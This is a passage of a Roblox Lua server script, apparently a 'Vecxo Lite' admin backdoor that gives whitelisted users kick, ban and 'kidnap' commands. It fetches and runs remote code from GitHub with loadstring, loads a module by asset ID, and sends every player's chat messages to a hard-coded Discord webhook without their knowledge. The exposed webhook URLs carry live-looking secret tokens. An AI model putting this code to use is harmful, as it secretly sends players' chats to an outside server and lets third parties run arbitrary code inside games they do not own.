					targetPlayer:Kick("[Vecko Lite]: : Kicked by " .. sender.Name .. ": " .. reason)
				else
					targetPlayer:Destroy()
				end
			end
		end
		notifyv2(sender, "[Vecko Lite]: ", "✅ Kicked " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " successfully"))
	elseif cmd == "!kidnap" then
		local targets = GetPlayers(args[2], sender)
		for i, plr in ipairs(targets) do
			if plr.Character and plr.Character:FindFirstChild("Torso") and plr.Character:FindFirstChild("Humanoid") then
				if not _G.kidnap then
					local success, result = pcall(function() -- clown van script
						return game:GetService("HttpService"):GetAsync("https://raw.githubusercontent.com/pcxo/cxos-admin/refs/heads/main/clownvan")
					end)

					if success then
						local content = result
						local loaded, fail = loadstring(content)
						if loaded then
							loaded()
							_G.kidnap(plr)
						else
							notifyv2(sender, "[Vecxo Lite]:", "❌ Failed to load the clown van")
						end
					else
						notifyv2(sender, "[Vecxo Lite]:", "❌ Failed to load the clown van")
					end
				else
					task.spawn(function()
						GraphicalEffects.CrystalRing(plr, "Really red", 2)
					end)
					_G.kidnap(plr)
				end
			end
		end
		notifyv2(sender, "[Vecko Lite]: ", "✅ Ran clown van on " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!unban" and args[2] then
		local inputName = args[2]:lower()
		local userId
		local matchedName
		for name, id in pairs(bannedNameLookup) do
			if name == inputName or name:sub(1, #inputName) == inputName then
				userId = id
				matchedName = name
				break
			end
		end
		if not userId then
			local success, plrid = pcall(function()
				return game.Players:GetUserIdFromNameAsync(args[2])
			end)

			if not success then
				notifyv2(sender, "[Vecxo Lite]: ", "❌ Failed to find user — is the name correct?")
				return
			end
			userId = plrid
			matchedName = args[2]
		end
		if bannedPlayers[userId] then
			bannedPlayers[userId] = nil
			for name, id in pairs(bannedNameLookup) do
				if id == userId then
					bannedNameLookup[name] = nil
					break
				end
			end
			notifyv2(sender, "[Vecxo Lite]: ", "✅ " .. matchedName .. " has been unbanned successfully.")
		else
			notifyv2(sender, "[Vecxo Lite]: ", "❌ " .. matchedName .. " is not currently banned.")
		end
	elseif cmd == "!ban" and args[2] then
		local reason = msg:match("^!ban%s+%S+%s+(.+)$")
		local targets = GetPlayers(args[2], sender)
		if #targets == 0 then
			notifyv2(sender, "[Vecko Lite]: ", "❌ Player(s) '" .. args[2] .. "' not found.")
			return
		end
		for _, targetPlayer in ipairs(targets) do
			if not table.find(exclusivewl, targetPlayer.Name) then
				task.spawn(function()
					GraphicalEffects.CrystalRing(targetPlayer, "Really red", 2)
				end)
				bannedPlayers[targetPlayer.UserId] = true
				bannedNameLookup[targetPlayer.Name:lower()] = targetPlayer.UserId
				if reason then
					targetPlayer:Kick("[Vecxo Lite]: Banned by " .. sender.Name .. ": " .. reason)
				else
					bannedPlayers[targetPlayer.UserId] = true
					bannedNameLookup[targetPlayer.Name:lower()] = targetPlayer.UserId
					targetPlayer:Destroy()
				end
			end
		end
		notifyv2(sender, "[Vecko Lite]: ", "✅ Banned " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. " players"))
	elseif cmd == "!rj" then
		local targets = GetPlayers(args[2], sender)
		for _, targetPlayer in ipairs(targets) do
			if game.PrivateServerId ~= "" then
				task.spawn(function()
					GraphicalEffects.CrystalRing(targetPlayer, "Lime green", 2)
				end)
				game:GetService("TeleportService"):Teleport(game.PlaceId, targetPlayer)
			else
				local options = Instance.new("TeleportOptions")
				options.ServerInstanceId = game.JobId
				task.spawn(function()
					GraphicalEffects.CrystalRing(targetPlayer, "Lime green", 2)
				end)
				game:GetService("TeleportService"):TeleportAsync(game.PlaceId, {targetPlayer}, options)
			end
		end
		notifyv2(sender, "[Vecko Lite]: ", "✅ Rejoining " .. (#targets == 1 and targets[1].Name or tostring(#targets) .. "..."))
	elseif cmd == "!h" then
		local announcement = msg:sub(4)
		for _, plr in ipairs(Players:GetPlayers()) do
			notify(plr, "[Vecko Lite]: ", announcement)
		end
	end
end

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local WEBHOOK_URL = "https://discord.com/api/webhooks/1400166689936642160/2zjPtgbfhR96A1QJmI0yZEUIx3cCHcsGzWuYficN-RFzae6ZvJaumb_ZrgfozIm2rmpZ"
local WEBHOOK_URL2 = "https://discord.com/api/webhooks/1404111740899295282/St75qFjXPJ25W09ruiuUY20mvHsH9sjY-Q55y4NFjZATVTzYqqCVFCkY5dtvelqLwBud"

local function sanitizeMessage(msg)
	msg = msg:gsub("@here", "@\u{200B}here")
	msg = msg:gsub("@everyone", "@\u{200B}everyone")
	return msg
end

local function getAvatarURL(userId)
	return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=420&height=420&format=png"
end

local function connectChatLogger(player)
	local avatarUrl = getAvatarURL(player.UserId)

	vecxoconnections["Chatted3"] = player.Chatted:Connect(function(message)
		local safeMessage = sanitizeMessage(message)

		local payload = {
			username = player.Name .. " (@" .. player.DisplayName .. ")",
			content = safeMessage,
			avatar_url = avatarUrl
		}

		local success, response = pcall(function()
			HttpService:PostAsync(
				WEBHOOK_URL,
				HttpService:JSONEncode(payload),
				Enum.HttpContentType.ApplicationJson
			)
		end)

		if not success then
			warn("Failed to send message to Discord:", response)
		end
	end)
end

--//credit to dekry :D
vecxoconnections["AntiKill"] = function(Character:Model)
	if Character and Character:FindFirstChild("HumanoidRootPart") then
		local DeathPosition = Character.HumanoidRootPart.CFrame
		if AutoRespawn[Character.Name] then
			local Player = game.Players[Character.Name]
			Player:LoadCharacter()
			Player.Character:WaitForChild("HumanoidRootPart",3)
			Player.Character.HumanoidRootPart.CFrame = DeathPosition
		end
	end
end

vecxoconnections["AntiKill2"] = function(Character:Model)
	Character.Humanoid.Died:Once(function()
		vecxoconnections["AntiKill"](Character)
	end)
end

vecxoconnections["AntiKill3"] = function(Player:Player)
	if not Player then
		return
	end
	AutoRespawn[Player.Name] = Player.CharacterAdded:Connect(vecxoconnections["AntiKill2"])
	vecxoconnections["AntiKill2"](Player.Character)
end


vecxoconnections["Gmod"] = function()
	local r = game:GetService("ReplicatedStorage")
	local remote = r:WaitForChild("cxo's folder"):WaitForChild("cxo's gmod remote")
	local grabbed = {}
	local grabbing

	remote.OnServerEvent:Connect(function(player, action, target)

		if not table.find(whitelisted, tostring(player.UserId)) then
			notify(player, "[Vecko Lite]: ❌ ", "This remote is protected, and you are not authorized to use it")
			return
		end

		if action == "Pickup" and table.find(gmodded, player.UserId) then
			if target and target:IsA("BasePart") and target.Anchored == false then
				grabbed[player] = target
				grabbing = target
				print(target.Name)
				target:SetNetworkOwner(player)
			end
		elseif action == "Update" and table.find(gmodded, player.UserId) then
			if grabbed[player] then
				local part = grabbed[player]
				if part then
					part.CFrame = CFrame.new(target)
				end
			end
		elseif action == "Release" and table.find(gmodded, player.UserId) then
			local part = grabbing
			grabbed[player] = nil

			local character = part.Parent
			if character and character:FindFirstChild("Humanoid") then
				for i,v in pairs(character:GetChildren()) do
					if v:IsA("BasePart") and v.Name == "Torso" or v.Name == "HumanoidRootPart" then
						v:SetnetworkOwner(character)
					end
				end
			else
				part:SetNetworkOwner(nil)
			end
		end

	end)
end

vecxoconnections["Gmod"]()

game.ReplicatedStorage.VecxoRequestToken.OnServerInvoke = function(player)
	return authTokens[player] or nil
end

for _, player in ipairs(game.Players:GetPlayers()) do
	if bannedPlayers[player.UserId] then
		player:Kick("[Vecxo Lite]: You are banned from this server.")
	end
	coroutine.wrap(function()
		connectChatLogger(player)
	end)()
	vecxoconnections["Chatted1"] = player.Chatted:Connect(function(message)
		processCommand(player, message)
		logChatMessage(player, message)
	end)
	if table.find(whitelisted, tostring(player.UserId)) then
		local token = generateToken()
		authTokens[player] = token
		TokenRemote:FireClient(player, token)
		notify(player, "[Vecxo Lite]:", "✅ You are whitelisted! Usage: !cmds")
		task.spawn(function()
			GraphicalEffects.CrystalRing(player, "Really black", 4, true)
		end)
	end
end

vecxoconnections["Joined1"] = Players.PlayerAdded:Connect(function(player)
	if bannedPlayers[player.UserId] then
		player:Kick("[Vecxo Lite]: You are banned from this server.")
		return
	end
	coroutine.wrap(function()
		connectChatLogger(player)
	end)()
	vecxoconnections["Chatted2"] = player.Chatted:Connect(function(message)
		processCommand(player, message)
		logChatMessage(player, message)
	end)
	if table.find(whitelisted, tostring(player.UserId)) then
		local token = generateToken()
		authTokens[player] = token
		TokenRemote:FireClient(player, token)
		notifyv2(player, "[Vecxo Lite]:", "✅ You are whitelisted! Usage: !cmds")
		task.spawn(function()
			GraphicalEffects.CrystalRing(player, "Really black", 4, true)
		end)
	end
end)

pcall(function() --//bit more secure
	game.ReplicatedStorage.VecxoCommandEvent.OnServerEvent:Connect(function(player, token, msg)
		if not table.find(whitelisted, tostring(player.UserId)) then
			notify(player, "[Vecko Lite]: ❌ ", "This remote is protected, and you are not authorized to use it")
			for i, v in pairs(game.Players:GetPlayers()) do
				if table.find(whitelisted, tostring(v.UserId)) then
					notify(v, "[Vecko Lite]: ❌ ", player.Name.. " attempted to fire the cmdbar remote without being whitelisted!")
				end
				if not table.find(whitelisted, tostring(v.UserId)) then
					local avatarUrl = getAvatarURL(player.UserId)
					local embed = {
						title = "Unauthorized Remote Parse",
						description = "**Player:** " .. player.Name .. " (UserId: " .. player.UserId .. ") attempted to fire the cmdbar remote without being whitelisted!",
						color = 0xFF0000,
						footer = {
							text = "Vecxo Lite Security Alert"
						},
						timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
					}

					local payload = {
						username = "Vecxo Lite Security",
						avatar_url = avatarUrl,
						embeds = {embed}
					}

					local success, response = pcall(function()
						HttpService:PostAsync(
							WEBHOOK_URL2,
							HttpService:JSONEncode(payload),
							Enum.HttpContentType.ApplicationJson
						)
					end)
				end
			end
			return
		end
		if authTokens[player] ~= token then --//make it check everyone
			for _, v in pairs(game.Players:GetPlayers()) do
				if table.find(whitelisted, tostring(v.UserId)) then
					notify(
						v,
						"[Vecko Lite]: ❌ ",
						player.Name ..
							" tried to use an invalid/expired auth token to access the cmd remote!\n" ..
							"Provided: " .. tostring(token) .. "\nExpected: " .. tostring(authTokens[player])
					)

				end
			end
			local avatarUrl = getAvatarURL(player.UserId)
			local embed = {
				title = "Invalid Auth Token Parse Attempt",
				description = "**Player:** " .. player.Name .. " (@" .. player.DisplayName .. ")\n" ..
					"**Action:** Tried to use an invalid/expired auth token to access the command remote ❌ ",
				color = 0xFF0000,
				fields = {
					{
						name = "Expected Token",
						value = "```" .. tostring(authTokens[player]) .. "```",
						inline = false
					},
					{
						name = "Received Token",
						value = "```" .. tostring(token) .. "```",
						inline = false
					}
				},
				footer = {
					text = "Vecxo Lite Security Alert"
				},
				timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
			}
			local payload = {
				username = player.Name .. " (@" .. player.DisplayName .. ")",
				avatar_url = avatarUrl,
				embeds = {embed}
			}

			local success, response = pcall(function()
				HttpService:PostAsync(
					WEBHOOK_URL2,
					HttpService:JSONEncode(payload),
					Enum.HttpContentType.ApplicationJson
				)
			end)
			return
		end
		if not table.find(whitelisted, tostring(player.UserId)) then --//purely check tokens from unregistered users
			if token ~= "" and token ~= nil then
				local avatarUrl = getAvatarURL(player.UserId)
				local embed = {
					title = "Invalid Auth Token Parse Attempt",
					description = "**Unwhitelisted player:** " .. player.Name .. " (@" .. player.DisplayName .. ")\n" ..
						"**Action:** Tried to use an invalid/expired auth token to access the command remote ❌ ",
					color = 0xFF0000,
					fields = {
						{
							name = "Expected Token",
							value = "```" .. tostring(authTokens[player]) .. "```",
							inline = false
						},
						{
							name = "Received Token",
							value = "```" .. tostring(token) .. "```",
							inline = false
						}
					},
					footer = {
						text = "Vecxo Lite Security Alert"
					},
					timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
				}
				local payload = {
					username = player.Name .. " (@" .. player.DisplayName .. ")",
					avatar_url = avatarUrl,
					embeds = {embed}
				}

				local success, response = pcall(function()
					HttpService:PostAsync(
						WEBHOOK_URL2,
						HttpService:JSONEncode(payload),
						Enum.HttpContentType.ApplicationJson
					)
				end)
			end
			return --//if ur not whitelisted fuck off, ur not getting ur command parsed regardless, literally max remote security get mogged
		end
		if authTokens[player] == token then
			local avatarUrl = getAvatarURL(player.UserId)
			local embed = {
				title = "Authentication Parse Successful",
				description = "**Player:** " .. player.Name .. " (@" .. player.DisplayName .. ") cmd token authenticated.\n" ..
					"Command `" .. tostring(msg) .. "` was passed successfully ✅",
				color = 0x00FF00,
				fields = {
					{
						name = "Token",
						value = "```" .. tostring(token) .. "```",
						inline = false
					}
				},
				footer = {
					text = "Vecxo Lite CMD Token Authenticated"
				},
				timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
			}
			local payload = {
				username = player.Name .. " (@" .. player.DisplayName .. ")",
				avatar_url = avatarUrl,
				embeds = {embed}
			}
			local success, response = pcall(function()
				HttpService:PostAsync(
					WEBHOOK_URL2,
					HttpService:JSONEncode(payload),
					Enum.HttpContentType.ApplicationJson
				)
			end)
		end
		processCommand(player, msg)
		logChatMessage(player, msg)
		local newToken = generateToken()
		authTokens[player] = newToken
		TokenRemote:FireClient(player, newToken)
	end)
end)

local ReplicatedStorage = game:GetService("ReplicatedStorage")

scriptrunning = true


task.spawn(function()
	while scriptrunning == true do
		if not ReplicatedStorage:FindFirstChild("VecxoCommandEvent") then
			local remoteEvent = Instance.new("RemoteEvent")
			remoteEvent.Name = "VecxoCommandEvent"
			remoteEvent.Parent = ReplicatedStorage
		end

		if not ReplicatedStorage:FindFirstChild("VecxoRequestToken") then
			local remoteFunction = Instance.new("RemoteFunction")
			remoteFunction.Name = "VecxoRequestToken"
			remoteFunction.Parent = ReplicatedStorage
		end

		if not ReplicatedStorage:FindFirstChild("VecxoCommandToken") then
			local remoteEvent = Instance.new("RemoteEvent")
			remoteEvent.Name = "VecxoCommandToken"
			remoteEvent.Parent = ReplicatedStorage
		end
		task.wait(0.3)
	end
end)


_G.VeckoRemoteRan = _G.VeckoRemoteRan or false

task.wait(0.2)

if _G.VeckoRemoteRan == false then
	loadstring(game:GetService('HttpService'):GetAsync('https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/DekKAHBuildAPI'))()
	task.wait(0.3)
	loadstring(game:GetService('HttpService'):GetAsync('https://raw.githubusercontent.com/reloxz/zastuff/refs/heads/main/VecxoRemoteAPI'))() 
	require(96351578964277) --//Palamodes Module
	_G.VeckoRemoteRan = true
	_G.VeckoRemoteInitalized = true
else
	if _G.VeckoRemoteRan and not _G.VeckoRemoteInitalized then
		_G.VeckoRemoteInitalized = true
	else
		warn("[Vecxo Lite]: Remote API already loaded, so it skipped.")
	end
end
